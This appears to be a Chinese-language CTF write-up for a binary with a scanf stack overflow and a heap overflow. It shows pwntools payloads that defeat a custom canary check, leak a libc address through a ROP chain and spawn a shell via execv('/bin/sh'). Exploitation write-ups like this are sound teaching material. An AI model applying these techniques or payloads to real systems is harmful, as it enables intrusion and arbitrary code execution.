
## Vuln

1. scanf栈溢出
2. 堆上缓冲区溢出

## leak

程序有一个类似canary的检测。<br>

```C
// 保存res
struct manhea_addr
{
    u64 number;
    (void*) pt;       // 0x100
};

// 类似栈的方式存随机数
struct roun_ptr
{
    u64 number;
    (void*) pt;       // 0x320
};

```
roun_ptr对应的结构用来存放随机数，可以看成栈，每次函数开始就会push一个数，然后结束pop检测有没有溢出。
```C
v2 = push_numb();
//...
result = pop_numb();
if ( result != v2 )
  err_exit();
```

### bypass
绕过检测需要结合后面的堆溢出<br>
```Python
calc_numb1 = 0x24242420
calc_numb2 = 0x24242420
io.recvuntil("Input your name pls: ")
payload = '0'*0x108
payload += p64(calc_numb1*calc_numb2)   # numb chk
payload += p64(0x602288)
payload += p64(0x0000000000401123)  # pop rdi ret
payload += p64(0x601FF0)    # libc got
payload += p64(0x400850)
payload += p64(0x400FB7)    # return address
payload += '\n'
io.send(payload)
```
首先开始将程序构造的canary给覆盖成一个固定的值，这里覆盖成 0x24242420*0x24242420。<br>
就行了通过程序给定的乘法将之后要pop的值也覆盖成0x24242420*0x24242420(其他不行，算不到这个值)
```Python
for i in range(0x20):
    mAdd(calc_numb1, calc_numb2)
    dlySend("yes")
mSub(0x100, 0x100)
dlySend("yes")
mAdd(0x100, 0x11)   # size 0x111
dlySend("yes")
mMulti(calc_numb1, calc_numb2)  # fake number
dlySend("yes")
```
> 利用程序的保存计算的值没有进行数量的检测造成缓冲区溢出
> 还需要主要scanf过滤的字符

## exp
经过上面的操作已经可以leak出对应的地址了，但是还要进行一次溢出才行。<br>
这里不能直接溢出到main函数，因为其对应地址会被scanf过滤<br>
也不能溢出到0x400FA2(主程序地址)
```Assembly
.text:0000000000400FA2                 push    rbp
.text:0000000000400FA3                 mov     rbp, rsp
.text:0000000000400FA6                 sub     rsp, 110h
.text:0000000000400FAD                 mov     eax, 0
.text:0000000000400FB2                 call    @push_numb
.text:0000000000400FB7                 mov     [rbp+var_8], rax
.text:0000000000400FBB                 lea     rdi, aInputYourNameP ; "Input your name p
```
因为经过之前的操作，manhea_addr中的number已经覆盖过roun_ptr对应存放数值的堆块的第一个值，再往后覆盖是不能像之前一样绕过下面的检测
```Assembly
.text:000000000040101D                 call    @pop_numb
.text:0000000000401022                 cmp     rax, [rbp+var_8]
.text:0000000000401026                 jz      short loc_401033
.text:0000000000401028                 mov     eax, 0
.text:000000000040102D                 call    @err_exit
```
这里可以直接让之前的返回地址未0x0000000000400FB7，这样的话，之后@pop_numb的值一定就是0x111(堆的size)<br>
下面直接溢出即可
```Python
io.recvuntil("Input your name pls: ")
payload = '0'*0x108
payload += p64(0x111)   # numb chk
payload += '0'*0x08
payload += p64(exec_binshaddr)
payload += '\n'
io.send(payload)
```
这里是直接找libc中 execv "/bin/sh"
